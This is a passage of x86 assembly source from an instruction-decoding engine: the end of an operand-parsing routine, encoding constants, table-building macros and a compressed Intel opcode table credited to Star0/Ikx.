   cmp byte ptr [edi+t4oper],11b
   jne dontrefix               ; is it a register?

   mov byte ptr [esi+t4argtype],1      ; switch type

   tadam:

   ret

   dontrefix:

   xor edx,edx

   cmp al,100b
   jne notextended                 ; watch if we have
                               ; extended reg
   inc byte ptr [esi+t4argtype]            ; set it to 3

   mov dl,byte ptr [ebp]
   mov byte ptr [esi+t4argextreg],dl           ;
   inc ebp

   and dl,111b                 ; not an extend2

   cmp dl,101b
   jne notextended

   jmp tadam2

   notextended:

   cmp byte ptr [edi+t4oper],0             ; check operator 0
   jne notextended2

   cmp al,101b                     ; not an extend2
   jne tadam

   bt  dword ptr [edi+t4oper],1            ; check if we are
   jnc notamam                     ; switched mode

   add byte ptr [esi+t4argsize],20         ; put a warning about
   inc edx

   notextended2:

   cmp byte ptr [edi+t4oper],01b           ; check if the
   jne tadam2                      ; following val is a
                               ; a bit
   mov dl,1
   jmp loadit

   tadam2:

   inc ecx
   call    getsize                     ; get the size
   jmp loadit                      ; load it

   notMem:

   cmp eax, MemOffs                    ; check if we have
   jne notMemOfs                   ; a memofs

   notamam:

   call    getsize
   mov byte ptr [esi+t4argsize],dl
   jmp tadam2                      ; do it!

   notMemOfs:

   cmp eax,Far0
   jne getNear0                    ; check if we have
   mov edx,6                       ; a far dest
   jmp loadit                      ; just fix the size

   getNear0:

   mov byte ptr [esi+t4argtype],5

   cmp eax,Near0                   ; check if we have
   jne NotShort0                   ; Near, load near
                               ; val
   mov dl,4
   jmp loadit

   NotShort0:

   mov byte ptr [esi+t4argtype],6

   cmp eax,Short0                  ; watch if we have
   jne NotDisp0                    ; a short

   mov dl,1
   jmp loadit                      ; load the value

   NotDisp0:

   mov byte ptr [esi+t4argtype],7          ;

   cmp eax,MemFar
   ja  notfar

   mov eax,Mem                     ; we now have a mem
   jmp Thatsmem

   notfar:

   mov byte ptr [esi+t4argtype],9          ; set arg type 9
                               ; here we begin
   cmp eax,CRn                     ; strange operands
   ja  notCRn

   sub eax,DRn                     ; watch for CRn/TRn/DRn

   add byte ptr [esi+t4argtype],al
   mov al,byte ptr [edi+t4seg]
   mov byte ptr [esi+t4argextreg],al

   ret

   notCRn:

   mov byte ptr [esi+t4argtype],12         ; then watch if

   cmp eax,SegOld                  ; we have a seg/segold
   ja  notSegType

   mov al,byte ptr [edi+t4seg]
   mov byte ptr [esi+t4argextreg],al

   ret

   notSegType:

   inc byte ptr [esi+t4argtype]

   cmp eax,Mem64                   ; watch for a MEM64
   ja  notBlahType

   mov eax,Mem32
   jmp Thatsmem

   ret

   notBlahType:

   cmp eax, MemWIm8                ; watch for 3 operand operation
   ja  notMemWtype

   mov byte ptr [esi+t4argtype],2

   push    eax
   mov eax,MemWord             ; load it as a word
   call    Thatsmem

   add byte ptr [esi+t4argtype],15     ; set strange type
   pop eax

   sub esi,t4argsizeof             ; then modify the b4 arg

   push    word ptr [esi]

   mov edx,Imm                 ; and watch how to mod it.

   cmp eax,MemWImm
   je  notMemRegW8

   mov edx,Imm8

   notMemRegW8:

   mov eax,edx                 ; then get the edx
   call    Gotimm                  ; get the imediate

   pop word ptr [esi]

   notMemWtype1:

   ret

   notMemWtype:

   cmp eax, RegWIm8
   ja  notMemWtype1                ; watch if have a RegW/MemW

   push    eax

   mov eax,RegWord
   call    getoperand              ; load the reg

   pop eax

   mov byte ptr [esi+t4argtype],18     ;
   mov byte ptr [esi+t4argvalue],-2        ; then set the type

   cmp eax,RegWCl
   je  notMemWtype1                ; skip loading the value

   mov dl,1
   jmp loadit


   ; tadam ------------------------------------

   getsize:

   cmp ecx,1
   jne skipMembit              ; well, we don't word analyse

   bt  dword ptr [edi+t4prefix],1      ; check if we have a dword
   jc  makeit2

   makeit4:

   mov edx,4                   ; extended word
   ret

   skipMembit:

   cmp dl,1
   je  skip8bit                ; skip the 8 bit

   cmp byte ptr [edi+t4word],0         ; check if we have a
   jne skip8bit

   mov dl,1                    ; set 8 bit
   ret

   skip8bit:

   bt  dword ptr [edi+t4prefix],0
   jnc makeit4                 ; check if prefix is 16 bit
                           ; all normal, then set dword
   makeit2:

   mov edx,2                   ; return a word

   ret

   NULL        equ 0

   d1      equ 100

   Acc     equ 2
   AccWord     equ 3

   Reg     equ 4
   Reg8        equ 5
   Reg16       equ 6
   Reg32       equ 7

   RegWord     equ 8

   Imm     equ 9
   Imm8        equ 10
   Imm16       equ 11
   Imm32       equ 12

   Mem             equ     13
   Mem8            equ     14
   Mem16           equ     15
   Mem32           equ     16

   MemWord     equ 17          ; O think so :)

   MemOffs     equ 18

   Far0        equ 19
   Short0      equ 20
   Near0       equ 21

   MemFar      equ 22

   DX0     equ     24
   CL0     equ 25

   DRn     equ 26
   TRn     equ 27
   CRn     equ 28

   Seg0        equ 29
   SegOld      equ 30

   Mem64       equ 31

   MemWImm     equ 32
   MemWIm8     equ 33

   RegWCl          equ     34
   RegWIm8     equ 35

   ImmNEAR     equ Imm16
   ImmFAR      equ Imm16

   pRVb        equ 00000001b       ; -S
   pRV     equ 00000010b       ;  T-
   pCS     equ 00000100b       ; -A
   pDS     equ 00001000b       ;  R-
   pES     equ 00010000b       ; -Z
   pFS     equ 00100000b       ;  E-
   pGS     equ 01000000b       ; -R
   pSS     equ 10000000b       ;  0-

   instruction macro   name, operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

   iip&name&:
   ii&name&    equ iip&name& - iitable

                   db      0+((size/8)*16)                 ; 0
           db  operand1,operand2       ; 2-3

           dw  &binary&            ; 5

                   dd     ((((( ctype * 32 ) + stype ) * 32 + rtype ) * 32 + mtype ) * 32 + wtype ) * 32 + otype

   ;               db      '&name&',-1

   ii_&name&_end:
           endm

   instructionb    macro   name, operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

   iip&name&:
   ii&name&    equ iip&name& - iitable

                   db      1+((size/8)*16)                 ; 0
           dw  &binary&            ; 5

   ;               db      '&name&',-1
   ii_&name&_end:
           endm

   variance    macro operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

                   db      2+((size/8)*16)
           db  operand1,operand2       ; 1
           dw  &binary&            ; 4 + 2 = 6

                   dd     ((((( ctype * 32 ) + stype ) * 32 + rtype ) * 32 + mtype ) * 32 + wtype ) * 32 + otype

   ;       db  -1

           endm

   varianceb       macro operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

                   db      3+((size/8)*16)
           dw  &binary&            ; 4 + 2 = 6

   ;       db  -1

           endm

   instruction8    macro   name, operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

   iip&name&:
   ii&name&    equ iip&name& - iitable

                   db      0+((size/8)*16)                 ; 0
           db  operand1,operand2       ; 2-3

                   db      &binary&                        ; 5

                   dd     ((((( ctype * 32 ) + stype ) * 32 + rtype ) * 32 + mtype ) * 32 + wtype ) * 32 + otype

   ;               db      '&name&',-1

   ii_&name&_end:
           endm

   instruction8b   macro   name, operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

   iip&name&:
   ii&name&    equ iip&name& - iitable

                   db      1+((size/8)*16)                 ; 0
                   db      &binary&                        ; 5

   ;               db      '&name&',-1
   ii_&name&_end:
           endm


   variance8       macro operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

                   db      2+((size/8)*16)
           db  operand1,operand2       ; 1
                   db      &binary&                        ; 4 + 2 = 6

                   dd     ((((( ctype * 32 ) + stype ) * 32 + rtype ) * 32 + mtype ) * 32 + wtype ) * 32 + otype

   ;       db  -1
           endm

   variance8b      macro operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

                   db      3+((size/8)*16)
                   db      &binary&                        ; 4 + 2 = 6

   ;       db  -1
           endm


   instruction16   macro   name, operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

   iip&name&:
   ii&name&    equ iip&name& - iitable

                   db      0+((size/8)*16)                 ; 0
           db  operand1,operand2       ; 2-3

                   dw      &binary&                        ; 5

                   dd     ((((( ctype * 32 ) + stype ) * 32 + rtype ) * 32 + mtype ) * 32 + wtype ) * 32 + otype

   ;               db      '&name&',-1

   ii_&name&_end:
           endm

   instruction16b  macro   name, operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

   iip&name&:
   ii&name&    equ iip&name& - iitable

                   db      1+((size/8)*16)                 ; 0
                   dw      &binary&                        ; 5

   ;               db      '&name&',-1

   ii_&name&_end:
           endm

   variance16      macro operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

                   db      2+((size/8)*16)
           db  operand1,operand2       ; 1
                   dw      &binary&                        ; 4 + 2 = 6

                   dd     ((((( ctype * 32 ) + stype ) * 32 + rtype ) * 32 + mtype ) * 32 + wtype ) * 32 + otype

   ;       db  -1
           endm

   variance16b     macro operand1, operand2, binary, size, wtype, otype, rtype, mtype, stype, ctype

                   db      3+((size/8)*16)
                   dw      &binary&                        ; 4 + 2 = 6

   ;       db  -1
           endm

   prefix      macro   operand1, binary

                   db      1
           db  binary

           endm

   ; 159 different intruction recognized - 371 total entries

   iitable:

         prefix  pRV  , 01100110b              ; 66h
         prefix  pRVb , 01100111b              ; 67h
         prefix  pCS  , 00101110b
         prefix  pDS  , 00111110b
         prefix  pES  , 00100110b
         prefix  pFS  , 01100100b
         prefix  pGS  , 01101101b
         prefix  pSS  , 00110110b

   ; Intel opcode include (Crunched version) revision 1 by Star0/Ikx

    instruction16  ADD      , Reg     , Mem    , 0000001000000000b , 16,  7,  8, 10, 13,  0,  0
       variance16             Mem     , Reg    , 0000000000000000b , 16,  7,  8, 10, 13,  0,  0
       variance8              Acc     , Imm    , 00000100b ,  8,  7,  0,  0,  0,  0,  0
       variance16             Mem     , Imm8   , 1000001000000000b , 16,  7,  8,  0, 13,  0,  0
       variance16             Mem     , Imm    , 1000000000000000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b ADC      , Reg     , Mem    , 0001001000000000b , 16,  7,  8, 10, 13,  0,  0
       variance16b            Mem     , Reg    , 0001000000000000b , 16,  7,  8, 10, 13,  0,  0
       variance8b             Acc     , Imm    , 00010100b ,  8,  7,  0,  0,  0,  0,  0
       variance16b            Mem     , Imm8   , 1000001000010000b , 16,  7,  8,  0, 13,  0,  0
       variance16b            Mem     , Imm    , 1000000000010000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b SUB      , Reg     , Mem    , 0010101000000000b , 16,  7,  8, 10, 13,  0,  0
       variance16b            Mem     , Reg    , 0010100000000000b , 16,  7,  8, 10, 13,  0,  0
       variance8b             Acc     , Imm    , 00101100b ,  8,  7,  0,  0,  0,  0,  0
       variance16b            Mem     , Imm8   , 1000001000101000b , 16,  7,  8,  0, 13,  0,  0
       variance16b            Mem     , Imm    , 1000000000101000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b AND      , Reg     , Mem    , 0010001000000000b , 16,  7,  8, 10, 13,  0,  0
       variance16b            Mem     , Reg    , 0010000000000000b , 16,  7,  8, 10, 13,  0,  0
       variance8b             Acc     , Imm    , 00100100b ,  8,  7,  0,  0,  0,  0,  0
       variance16b            Mem     , Imm8   , 1000001000100000b , 16,  7,  8,  0, 13,  0,  0
       variance16b            Mem     , Imm    , 1000000000100000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b CMP      , Reg     , Mem    , 0011101000000000b , 16,  7,  8, 10, 13,  0,  0
       variance16b            Mem     , Reg    , 0011100000000000b , 16,  7,  8, 10, 13,  0,  0
       variance8b             Acc     , Imm    , 00111100b ,  8,  7,  0,  0,  0,  0,  0
       variance16b            Mem     , Imm8   , 1000001000111000b , 16,  7,  8,  0, 13,  0,  0
       variance16b            Mem     , Imm    , 1000000000111000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b XOR      , Reg     , Mem    , 0011001000000000b , 16,  7,  8, 10, 13,  0,  0
       variance16b            Mem     , Reg    , 0011000000000000b , 16,  7,  8, 10, 13,  0,  0
       variance8b             Acc     , Imm    , 00110100b ,  8,  7,  0,  0,  0,  0,  0
       variance16b            Mem     , Imm8   , 1000001000110000b , 16,  7,  8,  0, 13,  0,  0
       variance16b            Mem     , Imm    , 1000000000110000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b SBB      , Mem     , Reg    , 0001101000000000b , 16,  7,  8, 10, 13,  0,  0
       variance16b            Reg     , Mem    , 0001101000000000b , 16,  7,  8, 10, 13,  0,  0
       variance8b             Acc     , Imm    , 00011100b ,  8,  7,  0,  0,  0,  0,  0
       variance16b            Mem     , Imm8   , 1000001000011000b , 16,  7,  8,  0, 13,  0,  0
       variance16b            Mem     , Imm    , 1000000000011000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b OR       , Reg     , Mem    , 0000101000000000b , 16,  7,  8, 10, 13,  0,  0
       variance16b            Mem     , Reg    , 0000100000000000b , 16,  7,  8, 10, 13,  0,  0
       variance8b             Acc     , Imm    , 00001100b ,  8,  7,  0,  0,  0,  0,  0
       variance16b            Mem     , Imm8   , 1000001000001000b , 16,  7,  8,  0, 13,  0,  0
       variance16b            Mem     , Imm    , 1000000000001000b , 16,  7,  8,  0, 13,  0,  0

    instruction8  MOV     , MemOffs , Acc    , 10100010b ,  8,  7,  0,  0,  0,  0,  0
       variance8            Acc     , MemOffs, 10100000b ,  8,  7,  0,  0,  0,  0,  0
       variance8            Reg     , Imm    , 10110000b ,  8,  4,  0,  5,  0,  0,  0
       variance16           Mem     , Imm    , 1100011000000000b , 16,  7,  8,  0, 13,  0,  0
       variance16           Reg     , Mem    , 1000101000000000b , 16,  7,  8, 10, 13,  0,  0
       variance16           Mem     , Reg    , 1000100000000000b , 16,  7,  8, 10, 13,  0,  0
       variance16           Mem16   , Seg0   , 1000110000000000b , 16,  0,  8,  0, 13, 10,  0
       variance16           Seg0    , Mem16  , 1000111000000000b , 16,  0,  8,  0, 13, 10,  0
       variance             Reg32   , CRn    , 0010000011000000b , 32,  0,  0, 21,  0, 18,  0
       variance             CRn     , Reg32  , 0010001011000000b , 32,  0,  0, 21,  0, 18,  0
       variance             Reg32   , DRn    , 0010000111000000b , 32,  0,  0, 21,  0, 18,  0
       variance             DRn     , Reg32  , 0010001111000000b , 32,  0,  0, 21,  0, 18,  0
       variance             Reg32   , TRn    , 0010010011000000b , 32,  0,  0, 21,  0, 18,  0
       variance             TRn     , Reg32  , 0010011011000000b , 32,  0,  0, 21,  0, 18,  0

    instruction8  INC     , RegWord , NULL   , 01000000b ,  8,  0,  0,  5,  0,  0,  0
       variance16           Mem     , NULL   , 1111111000000000b , 16,  7,  8,  0, 13,  0,  0
    instruction8b DEC    , RegWord , NULL   , 01001000b ,  8,  0,  0,  5,  0,  0,  0
       variance16b          Mem     , NULL   , 1111111000001000b , 16,  7,  8,  0, 13,  0,  0

    instruction8 PUSH    , RegWord , NULL   , 01010000b ,  8,  0,  0,  5,  0,  0,  0
       variance16          MemWord , NULL   , 1111111100110000b , 16,  0,  8,  0, 13,  0,  0
       variance16          Seg0    , NULL   , 0000111110000000b , 16,  0,  0,  0,  0, 10,  0
       variance8           SegOld  , NULL   , 00000110b ,  8,  0,  0,  0,  0,  2,  0
       variance8           Imm8    , NULL   , 01101010b ,  8,  0,  0,  0,  0,  0,  0
       variance8           Imm     , NULL   , 01101000b ,  8,  0,  0,  0,  0,  0,  0
    instruction8 POP     , RegWord , NULL   , 01011000b ,  8,  0,  0,  5,  0,  0,  0
       variance16          MemWord , NULL   , 1000111100000000b , 16,  0,  8,  0, 13,  0,  0
       variance16          Seg0    , NULL   , 0000111110000001b , 16,  0,  0,  0,  0, 10,  0
       variance8           SegOld  , NULL   , 00000111b ,  8,  0,  0,  0,  0,  2,  0

    instruction8 RET     , NULL    , NULL   , 11000011b ,  8,  0,  0,  0,  0,  0,  0
       variance8           ImmNEAR , NULL   , 11000010b ,  8,  0,  0,  0,  0,  0,  0

    instruction8 RETF    , NULL    , NULL   , 11001011b ,  8,  0,  0,  0,  0,  0,  0
       variance8           ImmFAR  , NULL   , 11001010b ,  8,  0,  0,  0,  0,  0,  0


    instruction8 Jcc     , Short0  , NULL   , 01110000b ,  8,  0,  0,  0,  0,  0,  4
       variance16          Near0   , NULL   , 0000111110000000b , 16,  0,  0,  0,  0,  0, 12

    instruction16  CALL   , MemFar  , NULL   , 1111111100011000b , 16,  0,  8,  0, 13,  0,  0
       variance8            Near0   , NULL   , 11101000b ,  8,  0,  0,  0,  0,  0,  0
       variance8            Far0    , NULL   , 10011010b ,  8,  0,  0,  0,  0,  0,  0
       variance16           Mem     , NULL   , 1111111100010000b , 16,  0,  8,  0, 13,  0,  0
    instruction16  JMP    , MemFar  , NULL   , 1111111100101000b , 16,  0,  8,  0, 13,  0,  0
       variance8            Short0  , NULL   , 11101011b ,  8,  0,  0,  0,  0,  0,  0
       variance8            Near0   , NULL   , 11101001b ,  8,  0,  0,  0,  0,  0,  0
       variance8            Far0    , NULL   , 11101010b ,  8,  0,  0,  0,  0,  0,  0
       variance16           Mem     , NULL   , 1111111100100000b , 16,  0,  8,  0, 13,  0,  0

    instruction8  JCXZ    , Short0  , NULL   , 11100011b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b LOOP    , Short0  , NULL   , 11100010b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b LOOPZ   , Short0  , NULL   , 11100001b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b LOOPNZ  , Short0  , NULL   , 11100000b ,  8,  0,  0,  0,  0,  0,  0

    instruction16  MUL     , Mem     , NULL   , 1111011000100000b , 16,  7,  8,  0, 13,  0,  0
    instruction16  NEG     , Mem     , NULL   , 1111011000011000b , 16,  7,  8,  0, 13,  0,  0
    instruction16  NOT     , Mem     , NULL   , 1111011000010000b , 16,  7,  8,  0, 13,  0,  0

    instruction16  RCL     , Mem     , d1     , 1101000000010000b , 16,  7,  8,  0, 13,  0,  0
       variance16            Mem     , CL0    , 1101001000010000b , 16,  7,  8,  0, 13,  0,  0
       variance16            Mem     , Imm8   , 1100000000010000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b RCR     , Mem     , d1     , 1101000000011000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , CL0    , 1101001000011000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , Imm8   , 1100000000011000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b ROL     , Mem     , d1     , 1101000000000000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , CL0    , 1101001000000000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , Imm8   , 1100000000000000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b ROR     , Mem     , d1     , 1101000000001000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , CL0    , 1101001000001000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , Imm8   , 1100000000001000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b SAR     , Mem     , d1     , 1101000000111000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , CL0    , 1101001000111000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , Imm8   , 1100000000111000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b SHL     , Mem     , d1     , 1101000000100000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , CL0    , 1101001000100000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , Imm8   , 1100000000100000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b SHR     , Mem     , d1     , 1101000000101000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , CL0    , 1101001000101000b , 16,  7,  8,  0, 13,  0,  0
       variance16b           Mem     , Imm8   , 1100000000101000b , 16,  7,  8,  0, 13,  0,  0

    instruction  MOVZX   , RegWord , Mem8   , 1011011000000000b , 32,  0, 16, 18, 21,  0,  0
       variance            RegWord , Mem16  , 1011011100000000b , 32,  0, 16, 18, 21,  0,  0
    instructionb MOVSX   , RegWord , Mem8   , 1011111000000000b , 32,  0, 16, 18, 21,  0,  0
       varianceb           RegWord , Mem16  , 1011111100000000b , 32,  0, 16, 18, 21,  0,  0

    instruction8  AAA     , NULL    , NULL   , 00110111b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b AAS     , NULL    , NULL   , 00111111b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b CLC     , NULL    , NULL   , 11111000b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b CLD     , NULL    , NULL   , 11111100b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b CLI     , NULL    , NULL   , 11111010b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b CMC     , NULL    , NULL   , 11110101b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b CMPSB   , NULL    , NULL   , 10100110b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b CMPSD   , NULL    , NULL   , 10100111b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b CWD     , NULL    , NULL   , 10011001b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b CWDE    , NULL    , NULL   , 10011000b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b DAA     , NULL    , NULL   , 00100111b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b DAS     , NULL    , NULL   , 00101111b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b HLT     , NULL    , NULL   , 11110100b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b INSB    , NULL    , NULL   , 01101100b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b INSD    , NULL    , NULL   , 01101101b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b INT3    , NULL    , NULL   , 11001100b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b INTO    , NULL    , NULL   , 11001110b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b IRETD   , NULL    , NULL   , 11001111b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b LAHF    , NULL    , NULL   , 10011111b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b LEAVE   , NULL    , NULL   , 11001001b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b LODSB   , NULL    , NULL   , 10101100b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b LODSD   , NULL    , NULL   , 10101101b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b MOVSB   , NULL    , NULL   , 10100100b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b MOVSD   , NULL    , NULL   , 10100101b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b NOP     , NULL    , NULL   , 10010000b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b OUTSB   , NULL    , NULL   , 01101110b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b OUTSD   , NULL    , NULL   , 01101111b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b POPAD   , NULL    , NULL   , 01100001b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b POPFD   , NULL    , NULL   , 10011101b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b PUSHAD  , NULL    , NULL   , 01100000b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b PUSHFD  , NULL    , NULL   , 10011100b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b SALC    , NULL    , NULL   , 11010110b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b SAHF    , NULL    , NULL   , 10011110b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b SCASB   , NULL    , NULL   , 10101110b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b SCASD   , NULL    , NULL   , 10101111b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b STC     , NULL    , NULL   , 11111001b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b STD     , NULL    , NULL   , 11111101b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b STI     , NULL    , NULL   , 11111011b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b STOSB   , NULL    , NULL   , 10101010b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b STOSD   , NULL    , NULL   , 10101011b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b WAIT    , NULL    , NULL   , 10011011b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b XLAT    , NULL    , NULL   , 11010111b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b LOCK    , NULL    , NULL   , 11110000b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b REP     , NULL    , NULL   , 11110011b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b REPNZ   , NULL    , NULL   , 11110010b ,  8,  0,  0,  0,  0,  0,  0

    instruction8 XCHG    , AccWord , RegWord, 10010000b ,  8,  0,  0,  5,  0,  0,  0
   ;   variance            RegWord , AccWord, 10010000b ,  8,  0,  0,  5,  0,  0,  0
       variance16          Mem     , Reg    , 1000011000000000b , 16,  7,  8, 10, 13,  0,  0


    instruction8  ENTER   , Imm16   , Imm8   , 11001000b ,  8,  0,  0,  0,  0,  0,  0

    instruction8  IN      , Acc     , Imm8   , 11100100b ,  8,  7,  0,  0,  0,  0,  0
       variance8            Acc     , DX0    , 11101100b ,  8,  7,  0,  0,  0,  0,  0

    instruction8  OUT     , Imm8    , Acc    , 11100110b ,  8,  7,  0,  0,  0,  0,  0
       variance8            DX0     , Acc    , 11101110b ,  8,  7,  0,  0,  0,  0,  0

    instruction8  INT     , Imm8    , NULL   , 11001101b ,  8,  0,  0,  0,  0,  0,  0


    instruction16   INVD    , NULL    , NULL   , 0000111100001000b , 16,  0,  0,  0,  0,  0,  0
    instruction16b  RSM     , NULL    , NULL   , 0000111110101010b , 16,  0,  0,  0,  0,  0,  0
    instruction16b  RDMSR   , NULL    , NULL   , 0000111100110010b , 16,  0,  0,  0,  0,  0,  0
    instruction16b  RDTSC   , NULL    , NULL   , 0000111101010001b , 16,  0,  0,  0,  0,  0,  0
    instruction16b  RDPMC   , NULL    , NULL   , 0000111100110011b , 16,  0,  0,  0,  0,  0,  0
    instruction16b  WBINVD  , NULL    , NULL   , 0000111100001001b , 16,  0,  0,  0,  0,  0,  0
    instruction16b  WRMSR   , NULL    , NULL   , 0000111100110000b , 16,  0,  0,  0,  0,  0,  0
    instruction16b  CLTS    , NULL    , NULL   , 0000111100000110b , 16,  0,  0,  0,  0,  0,  0
    instruction16b  CPUID   , NULL    , NULL   , 0000111110100010b , 16,  0,  0,  0,  0,  0,  0

    instruction16  ARPL    , Mem16   , Reg16  , 0110001100000000b , 16,  0,  8, 10, 13,  0,  0
    instruction16b BOUND   , Reg32   , Mem64  , 0110001000000000b , 16,  0,  8, 10, 13,  0,  0

    instruction16  BSWAP   , RegWord , NULL   , 0000111111001000b , 16,  0,  0, 13,  0,  0,  0

    instruction16  DIV     , Mem     , NULL   , 1111011000110000b , 16,  7,  8,  0, 13,  0,  0
    instruction16b IDIV    , Mem     , NULL   , 1111011000111000b , 16,  7,  8,  0, 13,  0,  0

    instruction16  IMUL    , RegWord , MemWIm8, 0110101100000000b , 16,  0,  8, 10, 13,  0,  0
       variance16            RegWord , MemWImm, 0110100100000000b , 16,  0,  8, 10, 13,  0,  0
       variance16            RegWord , Imm8   , 0110101111000000b , 16,  0,  0, 10,  0,  0,  0
       variance16            RegWord , Imm    , 0110100111000000b , 16,  0,  0, 10,  0,  0,  0
       variance              RegWord , MemWord, 1010111100000000b , 32,  0, 16, 18, 21,  0,  0
       variance16            Mem     , NULL   , 1111011000101000b , 16,  7,  8,  0, 13,  0,  0

    instruction16  LDS     , Reg16   , Mem32  , 1100010100000000b , 16,  0,  8, 10, 13,  0,  0
       variance16            Reg32   , Mem64  , 1100010100000000b , 16,  0,  8, 10, 13,  0,  0
    instruction16b LES     , Reg16   , Mem32  , 1100010000000000b , 16,  0,  8, 10, 13,  0,  0
       variance16b           Reg32   , Mem64  , 1100010000000000b , 16,  0,  8, 10, 13,  0,  0

    instruction16  LEA     , RegWord , Mem    , 1000110100000000b , 16,  0,  8, 10, 13,  0,  0

    instruction16  TEST    , Mem     , Reg    , 1000010000000000b , 16,  7,  8, 10, 13,  0,  0
       variance8             Acc     , Imm    , 10101000b ,  8,  7,  0,  0,  0,  0,  0
       variance16            Mem     , Imm    , 1111011000000000b , 16,  7,  8,  0, 13,  0,  0

    instruction  BSF     , RegWord , MemWord, 1011110000000000b , 32,  0, 16, 18, 21,  0,  0
    instructionb BSR     , RegWord , MemWord, 1011110100000000b , 32,  0, 16, 18, 21,  0,  0
    instructionb LSL     , RegWord , MemWord, 0000001100000000b , 32,  0, 16, 18, 21,  0,  0
    instructionb LAR     , RegWord , MemWord, 0000001000000000b , 32,  0, 16, 18, 21,  0,  0

    instruction8  AAD     , Imm8    , NULL   , 11010101b ,  8,  0,  0,  0,  0,  0,  0
    instruction8b AAM     , Imm8    , NULL   , 11010100b ,  8,  0,  0,  0,  0,  0,  0

    instruction  BT      , MemWord , Imm8   , 1011101000100000b , 32,  0, 16,  0, 21,  0,  0
       variance            MemWord , RegWord, 1010001100000000b , 32,  0, 16, 18, 21,  0,  0
    instructionb BTC     , MemWord , Imm8   , 1011101000111000b , 32,  0, 16,  0, 21,  0,  0
       varianceb           MemWord , RegWord, 1011101100000000b , 32,  0, 16, 18, 21,  0,  0
    instructionb BTR     , MemWord , Imm8   , 1011101000110000b , 32,  0, 16,  0, 21,  0,  0
       varianceb           MemWord , RegWord, 1011001100000000b , 32,  0, 16, 18, 21,  0,  0
    instructionb BTS     , MemWord , Imm8   , 1011101000101000b , 32,  0, 16,  0, 21,  0,  0
       varianceb           MemWord , RegWord, 1010101100000000b , 32,  0, 16, 18, 21,  0,  0

    instruction  CMPXCHG , Mem     , Reg    , 1011000000000000b , 32, 15, 16, 18, 21,  0,  0
    instructionb XADD    , Mem     , Reg    , 1100000000000000b , 32, 15, 16, 18, 21,  0,  0

